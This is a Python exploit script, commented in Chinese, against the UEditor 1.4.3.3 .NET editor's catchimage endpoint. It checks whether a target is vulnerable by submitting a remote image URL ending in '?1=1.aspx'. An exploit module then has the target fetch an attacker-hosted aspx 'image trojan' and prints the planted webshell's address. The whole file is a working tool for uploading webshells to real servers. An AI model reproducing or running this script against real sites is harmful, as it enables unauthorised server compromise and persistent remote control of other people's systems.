#!/usr/bin/env python
# coding=utf-8
import requests,re
import urllib
# 忽略https报错
from urllib3.exceptions import InsecureRequestWarning
from urllib3 import disable_warnings
disable_warnings(InsecureRequestWarning)

def ueditor_1433_Parsing_vulnerability(url):
    relsult = {
        'name': 'Ueditor编辑器1.4.3.3 解析漏洞',
        'vulnerable': False
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    vulurl = urllib.parse.urljoin(url, '/ueditor/net/controller.ashx?action=catchimage')
    try:
        req = requests.get(vulurl, timeout=3, verify=False)
        if re.search(r'没有指定抓取源', req.text) or re.search(r'参数错误：没有指定抓取源', req.text):
            test_png = 'https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png?1=1.aspx'
            payload = r'source[]={0}'.format(test_png)
            req2 = requests.post(url=vulurl, headers=headers, timeout=3, verify=False, data=payload)
            if re.search(r'"url":"(.)*"', req2.text):
                upload_path = re.findall(r'"url":"(.*)"', req2.text)[0]
                verify_url = urllib.parse.urljoin(vulurl, upload_path)
                relsult['vulnerable'] = True
                relsult['method'] = 'POST'
                relsult['vulurl'] = vulurl
                relsult['position'] = 'data'
                relsult['payload'] = payload
                relsult['verify'] = verify_url
                relsult['exp'] = True
                relsult['about'] = 'https://www.cnblogs.com/hei-zi/p/13394764.html'

        return relsult
    except:
        return relsult

def output(relsult):
    first = True
    print('---\n')
    for r in relsult:
        if first:
            print('[!]', r.capitalize(), ':', relsult[r])
            first = False
        else:
            print('     ', r.capitalize(), ':', relsult[r])
    print('\n---')
def exp(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    print('\n[+] 正在加载 Ueditor编辑器1.4.3.3 解析漏洞EXP模块......')
    print('[+] 请上传aspx图片马到自己的公网服务器')
    png_path = input('[+] 输入aspx图片马的地址:')
    png_path = png_path + '?1=1.aspx'
    payload = r'source[]={0}'.format(png_path)
    vulurl = urllib.parse.urljoin(url, '/ueditor/net/controller.ashx?action=catchimage')
    req2 = requests.post(url=vulurl, headers=headers, timeout=3, verify=False, data=payload)
    if re.search(r'"url":"(.)*"', req2.text):
        print('[@] 上传成功!!!')
        upload_path = re.findall(r'"url":"(.*)"', req2.text)[0]
        webshell = urllib.parse.urljoin(vulurl, upload_path)
        print('[+] Webshell地址:', webshell)



if __name__ == '__main__':
    url = input('输入目标URL:')
    relsult = ueditor_1433_Parsing_vulnerability(url)
    if relsult['vulnerable']:
        print('[+] 正在生成报告......')
        output(relsult)
        choice = input('[+] 是否利用exp模块上传webshll(Y/n)?')
        if choice != 'n':
            exp(url)
    else:
        print('[-] 不存在漏洞')